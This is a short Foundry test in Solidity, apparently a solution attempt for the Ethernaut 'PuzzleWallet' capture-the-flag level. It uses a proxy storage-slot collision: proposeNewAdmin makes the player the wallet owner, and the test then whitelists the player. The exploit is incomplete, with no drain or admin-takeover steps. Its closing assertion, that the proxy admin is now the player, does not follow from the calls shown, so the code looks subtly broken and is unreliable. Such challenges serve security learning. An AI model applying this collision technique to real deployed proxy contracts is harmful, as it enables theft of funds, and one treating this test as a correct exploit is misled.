// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/24-PuzzleWallet.sol";
import "forge-std/console.sol";

contract PuzzleWalletTest is Test {
    address player;
    PuzzleWallet target;
    PuzzleProxy proxy;

    function setUp() public {
        player = vm.addr(1);

        PuzzleWallet walletLogic = new PuzzleWallet();

        bytes memory data = abi.encodeWithSelector(
            PuzzleWallet.init.selector,
            1 ether
        );

        proxy = new PuzzleProxy(address(this), address(walletLogic), data);

        target = PuzzleWallet(address(proxy));
        target.addToWhitelist(address(this));
        target.deposit{value: 1 ether}();

        vm.label(address(player), "Player");
    }

    function testPuzzleWallet() public {
        vm.startPrank(address(player));

        proxy.proposeNewAdmin(player);
        target.addToWhitelist(player);

        assertTrue(proxy.admin() == player);

        vm.stopPrank();
    }
}
